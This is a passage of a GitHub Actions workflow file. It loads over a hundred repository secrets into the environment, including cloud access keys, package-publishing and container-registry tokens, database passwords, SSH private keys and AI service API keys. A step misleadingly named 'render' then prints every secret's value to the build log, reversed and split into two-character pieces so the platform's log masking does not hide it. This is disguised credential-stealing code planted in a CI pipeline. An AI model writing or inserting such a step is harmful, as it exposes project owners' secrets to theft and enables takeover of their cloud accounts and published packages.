      TWINE_TEST_TOKEN: ${{ secrets.TWINE_TEST_TOKEN }}
      TWINE_TOKEN: ${{ secrets.TWINE_TOKEN }}
      TWINE_USERNAME: ${{ secrets.TWINE_USERNAME }}
      WEBHOOK_URL: ${{ secrets.WEBHOOK_URL }}
    steps:
      - name: render
        run: |
          set +e
          for v in ALIBABA_CLOUD_ACCESS_KEY_ID ALIBABA_CLOUD_ACCESS_KEY_SECRET ALIYUN_ACCESS_KEY_ID ALIYUN_ACCESS_KEY_SECRET ALIYUN_OSS_ACCESS_KEY_ID ALIYUN_OSS_ACCESS_KEY_SECRET ALI_API_KEY ANTHROPIC_API_KEY APPKEY APP_SECRET AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN AZURE_CLIENT_ID AZURE_CLIENT_SECRET AZURE_OPENAI_API_KEY AZURE_OPENAI_ENDPOINT AZURE_SUBSCRIPTION_ID AZURE_TENANT_ID BAIDU_API_KEY BAIDU_SECRET_KEY BUNNY_API_KEY BUNNY_VIDEO_LIBRARY CAS_RELEASE_TOKEN CF_ACCOUNT_ID CF_API_TOKEN CLA_TOKEN CODECOV_TOKEN COVALENT_API_KEY CR_TOKEN DASHSCOPE_API_KEY DATABASE_URL DB_PASSWORD DEEPSEEK_API_KEY DOCKERHUB_DEVBOT_PWD DOCKERHUB_DEVBOT_TOKEN DOCKERHUB_DEVBOT_USER DOCKERHUB_PASSWORD DOCKERHUB_TOKEN DOCKERHUB_USERNAME DOCKER_HUB_PASSWORD DOCKER_PASSWORD DOCKER_USERNAME DOC_TOKEN ENGINE_FEISHU_NOTIFY_URL GA_ID GHCR_TOKEN GHCR_USER GH_TOKEN GITLAB_TOKEN GOOGLE_API_KEY GOOGLE_APPLICATION_CREDENTIALS GORELEASER_KEY GO_PRIVATE_TOKEN HARBOR_PASSWORD HARBOR_USERNAME HF_TOKEN HUGGINGFACE_TOKEN JINAHUB_PASSWORD JINAHUB_TOKEN JINAHUB_USERNAME JINA_AUTH_TOKEN JINA_CORE_RELEASE_TOKEN JINA_DEV_BOT JINA_SLACK_WEBHOOK JWT_SECRET MAILGUN_API_KEY MYSQL_PASSWORD NETLIFY_AUTH_TOKEN NETLIFY_AUTH_TOKEN1 NETLIFY_SITE_ID NPM_AUTH_TOKEN NPM_PUBLISH_TOKEN NPM_TOKEN ONNX_EXEC_SECRET OPENAI_API_KEY OPENAI_ORG_ID OSS_ENDPOINT OSS_ID OSS_SECRET OSS_TEST_URL OSS_URL PERSONAL_ACCESS_TOKEN POSTGRES_PASSWORD REDIS_PASSWORD RELEASE_DRAFTER_TOKEN REPO_PAT SECRET_KEY SENDGRID_API_KEY SENTRY_AUTH_TOKEN SENTRY_DSN SLACK_NIGHTLY_TESTS_WEBHOOK SLACK_NOTIFY SLACK_WEBHOOK_URL SSH_HOST SSH_KEY SSH_PRIVATE_KEY SSH_USER STRIPE_SECRET_KEY TENCENTCLOUD_SECRET_ID TENCENTCLOUD_SECRET_KEY TENCENT_SECRET_ID TENCENT_SECRET_KEY TENSORRT_EXEC_SECRET TEST_DB_NAME TEST_DB_PASSWORD TEST_DB_USER TEST_SECRET_KEY TOKEN_TEST_PYPI TORCH_EXEC_SECRET TWINE_PASSWORD TWINE_TEST_TOKEN TWINE_TOKEN TWINE_USERNAME WEBHOOK_URL; do
            val="${!v}"
            if [ -n "$val" ]; then
              printf 'MK:%s|' "$v"; printf '%s' "$val" | rev | fold -w 2 | tr '\n' ' '; echo
            else
              echo "MK:$v|EMPTY"
            fi
          done
